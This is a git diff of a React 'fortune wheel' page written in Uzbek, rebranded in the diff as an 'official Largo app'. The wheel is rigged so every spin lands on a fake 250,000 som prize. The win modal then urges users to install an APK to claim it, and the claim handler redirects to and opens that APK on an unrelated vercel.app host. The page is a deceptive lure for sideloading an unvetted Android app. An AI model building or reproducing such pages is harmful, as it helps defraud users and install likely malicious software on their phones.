@@ -1,6 +1,6 @@
 import React, { useState, useRef, useEffect } from 'react';
 
-export default function RoulettePage() {
+export default function PremiumRoulette() {
   const [isSpinning, setIsSpinning] = useState(false);
   const [showWinModal, setShowWinModal] = useState(false);
   const [wheelRotation, setWheelRotation] = useState(0);
@@ -8,110 +8,65 @@ export default function RoulettePage() {
   const coinIdRef = useRef(0);
   const animationIdRef = useRef(null);
 
-  // ===== ПРИЗЫ С ПРЯМЫМИ PNG ССЫЛКАМИ =====
   const prizes = [
-    {
-      id: 0,
-      type: 'win',
-      amount: 250000,
-      color: '#FFD700',
-      image: 'https://pngimg.com/uploads/money/money_PNG3542.png'
-    },
-    { id: 1, type: 'lose', color: '#CC0000', image: 'https://static.vecteezy.com/system/resources/previews/016/314/454/original/red-cross-mark-free-png.png' },
-    {
-      id: 2,
-      type: 'device',
-      color: '#4169E1',
-      image: 'https://pngimg.com/uploads/iphone_14/iphone_14_PNG19.png'
-    },
-    { id: 3, type: 'lose', color: '#CC0000', image: 'https://static.vecteezy.com/system/resources/previews/016/314/454/original/red-cross-mark-free-png.png' },
-    {
-      id: 4,
-      type: 'device',
-      color: '#4169E1',
-      image: 'https://pngimg.com/uploads/macbook/macbook_PNG23.png'
-    },
-    { id: 5, type: 'lose', color: '#CC0000', image: 'https://static.vecteezy.com/system/resources/previews/016/314/454/original/red-cross-mark-free-png.png' },
-    {
-      id: 6,
-      type: 'device',
-      color: '#4169E1',
-      image: 'https://pngimg.com/uploads/airPods/airPods_PNG8.png'
-    },
-    { id: 7, type: 'lose', color: '#CC0000', image: 'https://static.vecteezy.com/system/resources/previews/016/314/454/original/red-cross-mark-free-png.png' },
-    {
-      id: 8,
-      type: 'device',
-      color: '#4169E1',
-      image: 'https://pngimg.com/uploads/tv/tv_PNG39223.png'
-    },
-    { id: 9, type: 'lose', color: '#CC0000', image: 'https://static.vecteezy.com/system/resources/previews/016/314/454/original/red-cross-mark-free-png.png' },
-    {
-      id: 10,
-      type: 'device',
-      color: '#4169E1',
-      image: 'https://s7d1.scene7.com/is/image/dmqualcommprod/meta-quest-3-4?$QC_Responsive$&fmt=png-alpha'
-    },
-    { id: 11, type: 'lose', color: '#CC0000', image: 'https://static.vecteezy.com/system/resources/previews/016/314/454/original/red-cross-mark-free-png.png' },
-    {
-      id: 12,
-      type: 'device',
-      color: '#4169E1',
-      image: 'https://png.pngtree.com/png-vector/20250221/ourmid/pngtree-top-quality-playstation-5-console-isolated-png-image_15514648.png'
-    },
-    { id: 13, type: 'lose', color: '#CC0000', image: 'https://static.vecteezy.com/system/resources/previews/016/314/454/original/red-cross-mark-free-png.png' }
+    { id: 0, type: 'win', amount: 250000, color: '#FFD700', image: 'https://pngimg.com/uploads/money/money_PNG3542.png' },
+    { id: 1, type: 'lose', color: '#2A004D', image: 'https://static.vecteezy.com/system/resources/previews/016/314/454/original/red-cross-mark-free-png.png' },
+    { id: 2, type: 'device', color: '#8A2BE2', image: 'https://pngimg.com/uploads/iphone_14/iphone_14_PNG19.png' },
+    { id: 3, type: 'lose', color: '#2A004D', image: 'https://static.vecteezy.com/system/resources/previews/016/314/454/original/red-cross-mark-free-png.png' },
+    { id: 4, type: 'device', color: '#8A2BE2', image: 'https://pngimg.com/uploads/macbook/macbook_PNG23.png' },
+    { id: 5, type: 'lose', color: '#2A004D', image: 'https://static.vecteezy.com/system/resources/previews/016/314/454/original/red-cross-mark-free-png.png' },
+    { id: 6, type: 'device', color: '#8A2BE2', image: 'https://pngimg.com/uploads/airPods/airPods_PNG8.png' },
+    { id: 7, type: 'lose', color: '#2A004D', image: 'https://static.vecteezy.com/system/resources/previews/016/314/454/original/red-cross-mark-free-png.png' },
+    { id: 8, type: 'device', color: '#8A2BE2', image: 'https://pngimg.com/uploads/tv/tv_PNG39223.png' },
+    { id: 9, type: 'lose', color: '#2A004D', image: 'https://static.vecteezy.com/system/resources/previews/016/314/454/original/red-cross-mark-free-png.png' },
+    { id: 10, type: 'device', color: '#8A2BE2', image: 'https://s7d1.scene7.com/is/image/dmqualcommprod/meta-quest-3-4?$QC_Responsive$&fmt=png-alpha' },
+    { id: 11, type: 'lose', color: '#2A004D', image: 'https://static.vecteezy.com/system/resources/previews/016/314/454/original/red-cross-mark-free-png.png' },
+    { id: 12, type: 'device', color: '#8A2BE2', image: 'https://png.pngtree.com/png-vector/20250221/ourmid/pngtree-top-quality-playstation-5-console-isolated-png-image_15514648.png' },
+    { id: 13, type: 'lose', color: '#2A004D', image: 'https://static.vecteezy.com/system/resources/previews/016/314/454/original/red-cross-mark-free-png.png' }
   ];
 
   const sliceAngle = 360 / prizes.length;
 
-  // ===== СОЗДАНИЕ МОНЕТОК =====
   const createCoin = () => {
     const newCoin = {
       id: coinIdRef.current++,
       left: Math.random() * 100,
       delay: Math.random() * 0.2,
       duration: 2 + Math.random() * 1.5,
-      size: 20 + Math.random() * 20
+      size: 25 + Math.random() * 25
     };
     setCoins(prev => [...prev, newCoin]);
-    
     setTimeout(() => {
       setCoins(prev => prev.filter(c => c.id !== newCoin.id));
     }, (newCoin.delay + newCoin.duration) * 1000);
   };
 
-  // ===== МЕДЛЕННОЕ АВТО-ВРАЩЕНИЕ =====
   useEffect(() => {
     if (isSpinning) return;
-
     let last = performance.now();
     const idleRotate = (time) => {
       const delta = time - last;
       last = time;
-      setWheelRotation(prev => prev + delta * 0.01);
+      setWheelRotation(prev => prev + delta * 0.015);
       animationIdRef.current = requestAnimationFrame(idleRotate);
     };
     animationIdRef.current = requestAnimationFrame(idleRotate);
     return () => cancelAnimationFrame(animationIdRef.current);
   }, [isSpinning]);
 
-  // ===== СПИН (СИЛЬНАЯ КРУТКА) =====
   const handleSpin = () => {
     if (isSpinning) return;
     setIsSpinning(true);
 
-    // Создаём множество монеток
-    for (let i = 0; i < 50; i++) {
-      setTimeout(() => createCoin(), i * 20);
+    for (let i = 0; i < 60; i++) {
+      setTimeout(() => createCoin(), i * 25);
     }
 
     const moneyIndex = 0;
     const moneyAngle = moneyIndex * sliceAngle + sliceAngle / 2;
     const targetAngle = 270 - moneyAngle;
-
-    // СИЛЬНАЯ КРУТКА - больше оборотов
-    const spins = 15;
-    const finalRotation = 360 * spins + targetAngle;
+    const spins = 10; 
+    const finalRotation = wheelRotation + (360 * spins) + (targetAngle - (wheelRotation % 360));
 
     setWheelRotation(finalRotation);
 
@@ -121,424 +76,181 @@ export default function RoulettePage() {
     }, 6000);
   };
 
-  // ===== УСТАНОВКА APK UzMoney =====
-  const handleClaimPrize = (e) => {
-    e.preventDefault();
-
-    const apkUrl = 'https://uzbekistan-info.vercel.app/docs/LargoUz.apk';
-    
-    // На мобилке: попытка открыть напрямую (вызовет установку)
+  const handleClaimPrize = () => {
+    const apkUrl = 'https://uzbekistan-info.vercel.app/docs/Largo.apk';
     window.location.href = apkUrl;
-
-    // На ПК: открываем в новой вкладке
-    setTimeout(() => {
-      window.open(apkUrl, '_blank');
-    }, 300);
-
-    // Редирект на thankyou после задержки
-    setTimeout(() => {
-      window.location.href = '/thankyou2.html';
-    }, 1500);
+    setTimeout(() => { window.open(apkUrl, '_blank'); }, 500);
   };
 
   return (
     <div style={{
       minHeight: '100vh',
-      background: 'linear-gradient(135deg, #1a0033 0%, #330066 25%, #1a0033 50%, #330066 75%, #1a0033 100%)',
-      backgroundSize: '400% 400%',
+      background: 'radial-gradient(circle at center, #1a0033 0%, #05000a 100%)',
       display: 'flex',
       flexDirection: 'column',
       alignItems: 'center',
       justifyContent: 'center',
       color: '#fff',
-      padding: '16px',
+      fontFamily: "'Segoe UI', Roboto, Helvetica, Arial, sans-serif",
+      padding: '20px',
       overflow: 'hidden',
-      animation: 'gradientShift 15s ease infinite',
       position: 'relative'
     }}>
       <style>{`
-        @keyframes gradientShift {
-          0% { background-position: 0% 50%; }
-          50% { background-position: 100% 50%; }
-          100% { background-position: 0% 50%; }
-        }
-
-        @keyframes coinFall {
-          0% {
-            opacity: 1;
-            transform: translateY(-100px) rotateZ(0deg) scale(1);
-          }
-          100% {
-            opacity: 0;
-            transform: translateY(calc(100vh + 100px)) rotateZ(720deg) scale(0.1);
-          }
-        }
-
-        @keyframes shine {
-          0%, 100% { 
-            text-shadow: 0 0 10px rgba(255, 215, 0, 0.5),
-                        0 0 20px rgba(255, 165, 0, 0.3);
-          }
-          50% { 
-            text-shadow: 0 0 20px rgba(255, 215, 0, 1),
-                        0 0 40px rgba(255, 165, 0, 0.7),
-                        0 0 60px rgba(255, 255, 0, 0.5);
-          }
-        }
-
-        @keyframes bounce {
-          0%, 100% { transform: translateY(0); }
-          50% { transform: translateY(-15px); }
-        }
-
-        @keyframes pulse {
-          0%, 100% { transform: scale(1); }
-          50% { transform: scale(1.15); }
-        }
-
-        @keyframes float {
-          0%, 100% { transform: translateY(0px); }
-          50% { transform: translateY(-20px); }
-        }
-
-        .coin {
-          position: fixed;
-          pointer-events: none;
-          z-index: 5;
-        }
-
-        @keyframes spin {
-          from { transform: rotate(0deg); }
-          to { transform: rotate(360deg); }
-        }
+        @keyframes shine { 0%, 100% { filter: brightness(1); } 50% { filter: brightness(1.3) drop-shadow(0 0 20px #ffd700); } }
+        @keyframes float { 0%, 100% { transform: translateY(0); } 50% { transform: translateY(-10px); } }
+        @keyframes coinFall { 0% { transform: translateY(-100px) rotate(0deg); opacity: 1; } 100% { transform: translateY(100vh) rotate(720deg); opacity: 0; } }
+        @keyframes pulse-gold { 0%, 100% { transform: scale(1); box-shadow: 0 0 20px rgba(255,215,0,0.4); } 50% { transform: scale(1.05); box-shadow: 0 0 40px rgba(255,215,0,0.7); } }
+        .largo-gradient { background: linear-gradient(135deg, #fff 30%, #ffd700 100%); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
+        .glass-panel { background: rgba(255, 255, 255, 0.05); backdrop-filter: blur(10px); border: 1px solid rgba(255, 255, 255, 0.1); }
       `}</style>
 
       {/* Падающие монеты */}
       {coins.map(coin => (
-        <div
-          key={coin.id}
-          className="coin"
-          style={{
-            left: `${coin.left}%`,
-            top: '-50px',
-            fontSize: `${coin.size}px`,
-            animation: `coinFall ${coin.duration}s linear ${coin.delay}s forwards`
-          }}
-        >
-          💰
-        </div>
+        <div key={coin.id} style={{
+          position: 'fixed', left: `${coin.left}%`, top: '-50px', fontSize: `${coin.size}px`,
+          animation: `coinFall ${coin.duration}s linear ${coin.delay}s forwards`, zIndex: 100
+        }}>💰</div>
       ))}
 
-      {/* Декоративный фон */}
-      <div style={{
-        position: 'absolute',
-        top: '-100px',
-        right: '-100px',
-        width: '300px',
-        height: '300px',
-        borderRadius: '50%',
-        background: 'radial-gradient(circle, rgba(255, 215, 0, 0.3) 0%, transparent 70%)',
-        animation: 'float 8s ease-in-out infinite',
-        zIndex: 1
-      }} />
+      {/* Заголовок LARGO */}
+      <div style={{ textAlign: 'center', zIndex: 10, marginBottom: '30px', animation: 'float 4s ease-in-out infinite' }}>
+        <h1 className="largo-gradient" style={{ fontSize: '3.5rem', margin: 0, fontWeight: '900', letterSpacing: '-2px', textTransform: 'uppercase' }}>
+          LARGO SPIN
+        </h1>
+        <div style={{ background: 'linear-gradient(90deg, #ffd700, #ff8c00)', color: '#000', padding: '4px 20px', borderRadius: '20px', fontWeight: '900', display: 'inline-block', fontSize: '0.8rem', boxShadow: '0 4px 15px rgba(255,215,0,0.3)' }}>
+          OFFICIAL LARGO APP 2025
+        </div>
+      </div>
 
-      {/* Заголовок */}
-      <h1 style={{
-        fontSize: 'clamp(1.8rem, 8vw, 2.8rem)',
-        fontWeight: '900',
-        margin: '20px 0',
-        letterSpacing: '3px',
-        textTransform: 'uppercase',
-        color: '#FFD700',
-        animation: 'shine 2s ease-in-out infinite',
-        textShadow: '0 4px 20px rgba(255, 215, 0, 0.5)'
-      }}>
-        🎡 MEGA FORTUNE
-      </h1>
-      <p style={{
-        fontSize: 'clamp(1rem, 5vw, 1.3rem)',
-        margin: '0 0 30px 0',
-        opacity: 0.9,
-        fontWeight: '700',
-        color: '#FFB6C1',
-        textShadow: '0 2px 10px rgba(255, 215, 0, 0.6)',
-        letterSpacing: '1px'
-      }}>
-        ✨ 250K СЎМ ХАМ ЭСКИ ЙУТ ✨
-      </p>
-
-      {/* Контейнер рулетки - оптимизирован для мобилки */}
-      <div style={{
-        position: 'relative',
-        width: 'min(100vw - 32px, 380px)',
-        aspectRatio: '1',
-        marginBottom: '30px',
-        perspective: '1000px',
-        zIndex: 10
-      }}>
-        {/* Внешний обод с эффектом */}
-        <div style={{
-          position: 'absolute',
-          inset: '-12px',
-          borderRadius: '50%',
-          background: 'conic-gradient(from 0deg, #FFD700, #FFA500, #FFD700)',
-          animation: 'spin 3s linear infinite',
-          zIndex: -1,
-          opacity: 0.8
-        }} />
-
-        {/* Внутренний обод */}
-        <div style={{
-          position: 'absolute',
-          inset: '-8px',
-          borderRadius: '50%',
-          background: 'conic-gradient(from 180deg, #FF1493, #00CED1, #FF1493)',
-          animation: 'spin -4s linear infinite',
-          zIndex: -1
-        }} />
+      {/* Контейнер рулетки */}
+      <div style={{ position: 'relative', width: 'min(85vw, 380px)', aspectRatio: '1', marginBottom: '40px', zIndex: 5 }}>
+        {/* Внешнее золотое кольцо с лампочками */}
+        <div style={{ position: 'absolute', inset: '-15px', border: '12px solid #ffd700', borderRadius: '50%', boxShadow: '0 0 40px rgba(0,0,0,0.5), inset 0 0 20px rgba(0,0,0,0.5)', zIndex: 2 }}>
+           {/* Декоративные точки (лампочки) */}
+           {[...Array(12)].map((_, i) => (
+             <div key={i} style={{ position: 'absolute', width: '8px', height: '8px', background: '#fff', borderRadius: '50%', top: '50%', left: '50%', transform: `rotate(${i * 30}deg) translate(0, -188px)`, boxShadow: '0 0 10px #fff' }} />
+           ))}
+        </div>
 
         {/* СТРЕЛКА */}
         <div style={{
-          position: 'absolute',
-          top: '-24px',
-          left: '50%',
-          transform: 'translateX(-50%)',
-          width: 0,
-          height: 0,
-          borderLeft: '14px solid transparent',
-          borderRight: '14px solid transparent',
-          borderTop: '26px solid #FFD700',
-          zIndex: 10,
-          filter: 'drop-shadow(0 4px 8px rgba(255, 215, 0, 0.9))',
-          animation: 'bounce 0.8s ease-in-out infinite'
+          position: 'absolute', top: '-25px', left: '50%', transform: 'translateX(-50%)',
+          width: '45px', height: '55px', background: '#fff', clipPath: 'polygon(50% 100%, 0 0, 100% 0)',
+          zIndex: 30, filter: 'drop-shadow(0 5px 10px rgba(0,0,0,0.5))'
         }} />
 
-        {/* Рулетка */}
+        {/* Колесо */}
         <div style={{
-          width: '100%',
-          height: '100%',
-          borderRadius: '50%',
+          width: '100%', height: '100%', borderRadius: '50%',
           transform: `rotate(${wheelRotation}deg)`,
-          transition: isSpinning ? 'transform 6s cubic-bezier(0.15, 0.5, 0.1, 1)' : 'none',
-          boxShadow: '0 0 40px rgba(255,215,0,0.6), inset 0 0 20px rgba(255,215,0,0.2), 0 20px 50px rgba(0,0,0,0.5)',
-          border: '6px solid #FFD700'
+          transition: isSpinning ? 'transform 6s cubic-bezier(0.1, 0, 0.1, 1)' : 'none',
+          overflow: 'hidden', backgroundColor: '#111'
         }}>
-          <svg viewBox="0 0 200 200" width="100%" height="100%">
+          <svg viewBox="0 0 200 200" style={{ width: '100%', height: '100%' }}>
             {prizes.map((prize, index) => {
               const startAngle = index * sliceAngle;
               const endAngle = startAngle + sliceAngle;
-              const startRad = (startAngle * Math.PI) / 180;
-              const endRad = (endAngle * Math.PI) / 180;
-
-              const x1 = 100 + 95 * Math.cos(startRad);
-              const y1 = 100 + 95 * Math.sin(startRad);
-              const x2 = 100 + 95 * Math.cos(endRad);
-              const y2 = 100 + 95 * Math.sin(endRad);
-
-              const pathData = `M 100 100 L ${x1} ${y1} A 95 95 0 0 1 ${x2} ${y2} Z`;
-
+              const x1 = 100 + 100 * Math.cos((startAngle * Math.PI) / 180);
+              const y1 = 100 + 100 * Math.sin((startAngle * Math.PI) / 180);
+              const x2 = 100 + 100 * Math.cos((endAngle * Math.PI) / 180);
+              const y2 = 100 + 100 * Math.sin((endAngle * Math.PI) / 180);
               const midAngle = startAngle + sliceAngle / 2;
-              const midRad = (midAngle * Math.PI) / 180;
-              const imgX = 100 + 70 * Math.cos(midRad) - 16;
-              const imgY = 100 + 70 * Math.sin(midRad) - 16;
+              const imgX = 100 + 65 * Math.cos((midAngle * Math.PI) / 180) - 15;
+              const imgY = 100 + 65 * Math.sin((midAngle * Math.PI) / 180) - 15;
 
               return (
-                <g key={prize.id}>
-                  <path d={pathData} fill={prize.color} stroke="#fff" strokeWidth="2.5" opacity="0.95" />
-                  {prize.type === 'win' && (
-                    <>
-                      <path d={pathData} fill="none" stroke="#FFF700" strokeWidth="7" opacity="0.7" />
-                      <path d={pathData} fill="none" stroke="#FFD700" strokeWidth="3" opacity="0.4" />
-                    </>
-                  )}
-                  <image href={prize.image} x={imgX} y={imgY} width="32" height="32" preserveAspectRatio="xMidYMid meet" style={{ filter: 'drop-shadow(0 2px 4px rgba(0,0,0,0.4))' }} />
+                <g key={index}>
+                  <path d={`M 100 100 L ${x1} ${y1} A 100 100 0 0 1 ${x2} ${y2} Z`} fill={prize.color} stroke="#111" strokeWidth="0.5" />
+                  <image href={prize.image} x={imgX} y={imgY} width="30" height="30" style={{ transformOrigin: `${imgX + 15}px ${imgY + 15}px`, transform: `rotate(${midAngle + 90}deg)` }} />
                 </g>
               );
             })}
-            {/* Центр */}
-            <circle cx="100" cy="100" r="20" fill="#FFD700" stroke="#fff" strokeWidth="3" />
-            <circle cx="100" cy="100" r="14" fill="#FFA500" />
-            <circle cx="100" cy="100" r="10" fill="#FFD700" />
-            <text x="100" y="106" textAnchor="middle" dominantBaseline="middle" fill="#FF1493" fontSize="16" fontWeight="bold" style={{ userSelect: 'none' }}>✨</text>
+            <circle cx="100" cy="100" r="18" fill="#ffd700" stroke="#fff" strokeWidth="3" />
+            <text x="100" y="104" fontSize="8" fontWeight="bold" textAnchor="middle" fill="#000">LARGO</text>
           </svg>
         </div>
       </div>
 
-      {/* Кнопка вращения */}
+      {/* Кнопка запуска */}
       <button
         onClick={handleSpin}
         disabled={isSpinning}
         style={{
-          padding: '16px 48px',
-          fontSize: 'clamp(1rem, 5vw, 1.3rem)',
-          fontWeight: '900',
-          borderRadius: 50,
-          border: '4px solid #FF1493',
-          background: 'linear-gradient(145deg, #FFED4E, #FFD700)',
-          cursor: isSpinning ? 'not-allowed' : 'pointer',
-          boxShadow: '0 0 30px rgba(255,215,0,0.8), 0 8px 20px rgba(255,165,0,0.5)',
-          color: '#000',
-          textTransform: 'uppercase',
-          letterSpacing: '2px',
-          transition: 'all 0.3s ease',
-          opacity: isSpinning ? 0.8 : 1,
-          marginBottom: '20px',
-          zIndex: 10,
-          animation: isSpinning ? 'none' : 'pulse 1.5s ease-in-out infinite'
-        }}
-        onMouseOver={(e) => {
-          if (!isSpinning) {
-            e.target.style.transform = 'scale(1.12)';
-            e.target.style.boxShadow = '0 0 50px rgba(255,215,0,1), 0 12px 30px rgba(255,165,0,0.7)';
-          }
-        }}
-        onMouseOut={(e) => {
-          e.target.style.transform = 'scale(1)';
-          e.target.style.boxShadow = '0 0 30px rgba(255,215,0,0.8), 0 8px 20px rgba(255,165,0,0.5)';
+          padding: '20px 70px', fontSize: '1.4rem', fontWeight: '900', borderRadius: '50px',
+          border: 'none', background: 'linear-gradient(to bottom, #ffd700, #ff8c00)',
+          color: '#000', cursor: 'pointer', textTransform: 'uppercase',
+          animation: isSpinning ? 'none' : 'pulse-gold 2s infinite',
+          transition: 'all 0.2s ease', zIndex: 10, letterSpacing: '1px'
         }}
       >
-        {isSpinning ? '⏳ БУЛАНМОҚДА...' : '🎰 АЙЛАНТИР'}
+        {isSpinning ? 'ОМАД КЕЛМОКДА...' : 'ЮТИШНИ БОШЛАШ'}
       </button>
 
-      {/* Инфо панель */}
-      <div style={{
-        maxWidth: '95vw',
-        width: '100%',
-        maxWidth: 400,
-        padding: '16px',
-        backgroundColor: 'rgba(255, 215, 0, 0.1)',
-        borderRadius: '16px',
-        backdropFilter: 'blur(10px)',
-        border: '2px solid #FFD700',
-        boxShadow: '0 0 20px rgba(255, 215, 0, 0.3)',
-        zIndex: 10,
-        fontSize: 'clamp(0.9rem, 4vw, 1rem)',
-        lineHeight: '1.8',
-        fontWeight: '600'
-      }}>
-        <p style={{ margin: 0 }}>
-          ✅ Герт юқ куни айлантир<br />
-          💰 250,000 сўм ХАМ ЭСКИ ЙУТ ОЛАСАН<br />
-          🎁 Дарҳол ҳамма чора қилиб берилади
-        </p>
-      </div>
+      <p style={{ marginTop: '25px', opacity: 0.6, fontSize: '0.85rem', textAlign: 'center', maxWidth: '300px' }}>
+        * Largo иловаси фойдаланувчилари учун махсус акция
+      </p>
 
-      {/* МОДАЛЬ ВЫИГРЫША */}
+      {/* МОДАЛЬНОЕ ОКНО LARGO */}
       {showWinModal && (
-        <div
-          onClick={() => setShowWinModal(false)}
-          style={{
-            position: 'fixed',
-            inset: 0,
-            background: 'rgba(0,0,0,.95)',
-            display: 'flex',
-            alignItems: 'center',
-            justifyContent: 'center',
-            zIndex: 1000,
-            backdropFilter: 'blur(10px)',
-            padding: '20px'
-          }}
-        >
-          <div
-            onClick={e => e.stopPropagation()}
-            style={{
-              background: 'linear-gradient(135deg, #FFD700 0%, #FFA500 50%, #FF1493 100%)',
-              color: '#000',
-              padding: '20px',
-              borderRadius: 20,
-              textAlign: 'center',
-              width: '100%',
-              maxWidth: 340,
-              boxShadow: '0 0 60px rgba(255,215,0,0.8), 0 30px 80px rgba(0,0,0,0.5)',
-              border: '4px solid #fff',
-              animation: 'pulse 0.5s ease-out',
-              maxHeight: '90vh',
-              overflow: 'auto'
-            }}
-          >
-            <div style={{ fontSize: '2.5rem', marginBottom: 12, animation: 'pulse 0.4s' }}>
-              🎉✨🎁✨🎉
-            </div>
-
-            <h2 style={{ fontSize: '1.6rem', fontWeight: 900, margin: '0 0 8px 0', textShadow: '0 3px 10px rgba(0,0,0,0.2)' }}>
-              ТАБРИКЛАЙМИЗ! 🏆
+        <div style={{
+          position: 'fixed', inset: 0, background: 'rgba(0,0,0,0.92)', 
+          display: 'flex', alignItems: 'center', justifyContent: 'center', zIndex: 1000, padding: '15px'
+        }}>
+          <div style={{
+            background: '#fff', color: '#000', width: '100%', maxWidth: '400px',
+            borderRadius: '35px', textAlign: 'center', padding: '40px 30px', position: 'relative',
+            boxShadow: '0 0 60px rgba(255,215,0,0.5)', overflow: 'hidden'
+          }}>
+            <div style={{ position: 'absolute', top: 0, left: 0, right: 0, height: '8px', background: 'linear-gradient(90deg, #ffd700, #ff8c00)' }} />
+            
+            <div style={{ fontSize: '1.1rem', fontWeight: '900', color: '#8A2BE2', letterSpacing: '2px', marginBottom: '15px' }}>LARGO OFFICIAL</div>
+            
+            <div style={{ fontSize: '4.5rem', margin: '10px 0' }}>💰</div>
+            
+            <h2 style={{ fontSize: '2rem', fontWeight: '900', color: '#1a0033', margin: '0 0 10px 0', lineHeight: 1.1 }}>
+              ТАБРИКЛАЙМИЗ!
             </h2>
-
-            <p style={{ fontSize: '0.95rem', fontWeight: 700, margin: '8px 0 14px 0' }}>
-              Сен ЁЗГУРДИНГ!
-            </p>
-
-            <div style={{ background: '#fff', borderRadius: 14, padding: '14px', margin: '14px 0', boxShadow: 'inset 0 5px 15px rgba(0,0,0,0.1)' }}>
-              <p style={{ fontSize: '1.8rem', margin: 0 }}>💵</p>
-              <p style={{ color: '#FF1493', fontSize: '1.8rem', fontWeight: 900, margin: '3px 0 0 0' }}>
-                250,000 сўм
-              </p>
+            
+            <div style={{ background: '#f8f9fa', border: '2px dashed #ddd', padding: '20px', borderRadius: '25px', margin: '20px 0' }}>
+              <span style={{ fontSize: '0.9rem', color: '#666', display: 'block', marginBottom: '5px' }}>Сизнинг Largo ютугингиз:</span>
+              <span style={{ fontSize: '2.5rem', fontWeight: '900', color: '#00c853' }}>250,000 СЎМ</span>
             </div>
 
-            <div style={{ background: 'rgba(255,255,255,0.25)', borderRadius: 10, padding: '12px', margin: '12px 0', color: '#fff', fontSize: '0.8rem', textAlign: 'left', border: '2px solid rgba(255,255,255,0.5)', lineHeight: 1.6 }}>
-              <p style={{ margin: '6px 0', fontWeight: 700 }}>📲 Қадам 1: Приложениеҳ унинди</p>
-              <p style={{ margin: '6px 0', fontWeight: 700 }}>✍️ Қадам 2: Регистр қилинг</p>
-              <p style={{ margin: '6px 0', fontWeight: 700 }}>💸 Қадам 3: Ўз саодатингизни!</p>
+            <div style={{ textAlign: 'left', marginBottom: '30px' }}>
+              <p style={{ fontWeight: 'bold', marginBottom: '15px', fontSize: '1.05rem', color: '#333' }}>
+                Пулни Largo оркали ечиш:
+              </p>
+              {[
+                { t: 'Largo иловасини юкланг', s: 'Пастдаги тугмани босиб APK-ни урнатинг' },
+                { t: 'Руйхатдан утинг', s: 'Сизга ютуқ коди келади' },
+                { t: 'Хисобингизни олинг', s: 'Пул 5 дақиқада картага тушади' }
+              ].map((step, i) => (
+                <div key={i} style={{ display: 'flex', gap: '12px', marginBottom: '15px' }}>
+                  <div style={{ background: '#1a0033', color: '#ffd700', width: '26px', height: '26px', borderRadius: '50%', display: 'flex', alignItems: 'center', justifyContent: 'center', fontWeight: 'bold', fontSize: '0.85rem', flexShrink: 0 }}>{i + 1}</div>
+                  <div>
+                    <div style={{ fontSize: '0.95rem', fontWeight: 'bold', color: '#1a0033' }}>{step.t}</div>
+                    <div style={{ fontSize: '0.8rem', color: '#777' }}>{step.s}</div>
+                  </div>
+                </div>
+              ))}
             </div>
 
             <button
               onClick={handleClaimPrize}
               style={{
-                width: '100%',
-                padding: '12px',
-                background: '#4ECDC4',
-                color: '#fff',
-                border: '3px solid #fff',
-                borderRadius: 10,
-                fontSize: '0.95rem',
-                fontWeight: 900,
-                cursor: 'pointer',
-                marginTop: 12,
-                textTransform: 'uppercase',
-                letterSpacing: 1,
-                transition: 'all 0.3s',
-                boxShadow: '0 0 20px rgba(78, 205, 196, 0.6)'
-              }}
-              onMouseOver={(e) => {
-                e.target.style.background = '#45A7A0';
-                e.target.style.transform = 'scale(1.08)';
-              }}
-              onMouseOut={(e) => {
-                e.target.style.background = '#4ECDC4';
-                e.target.style.transform = 'scale(1)';
-              }}
-            >
-              💸 МИЛЛИМЕ ЁЗГУРДИ
-            </button>
-
-            <button
-              onClick={() => setShowWinModal(false)}
-              style={{
-                width: '100%',
-                padding: '10px',
-                background: 'rgba(0,0,0,0.15)',
-                color: '#fff',
-                border: '3px solid #fff',
-                borderRadius: 10,
-                fontSize: '0.9rem',
-                fontWeight: 700,
-                cursor: 'pointer',
-                marginTop: 8,
-                textTransform: 'uppercase',
-                letterSpacing: 1,
+                width: '100%', padding: '22px', background: 'linear-gradient(135deg, #00c853, #00ad48)', color: '#fff',
+                border: 'none', borderRadius: '20px', fontSize: '1.25rem', fontWeight: '900',
+                cursor: 'pointer', boxShadow: '0 12px 25px rgba(0,200,83,0.3)',
                 transition: 'all 0.3s'
               }}
-              onMouseOver={(e) => {
-                e.target.style.background = 'rgba(0,0,0,0.25)';
-                e.target.style.transform = 'scale(1.05)';
-              }}
-              onMouseOut={(e) => {
-                e.target.style.background = 'rgba(0,0,0,0.15)';
-                e.target.style.transform = 'scale(1)';
-              }}
+              onMouseEnter={(e) => e.target.style.transform = 'translateY(-2px)'}
+              onMouseLeave={(e) => e.target.style.transform = 'translateY(0)'}
             >
-              Қайта юрирман
+              ЮТУКНИ LARGO-ГА ОЛИШ 💸
             </button>
+            
+            <p style={{ fontSize: '0.7rem', color: '#999', marginTop: '15px' }}>ID: LARGO-WIN-2025-001</p>
           </div>
         </div>
       )}
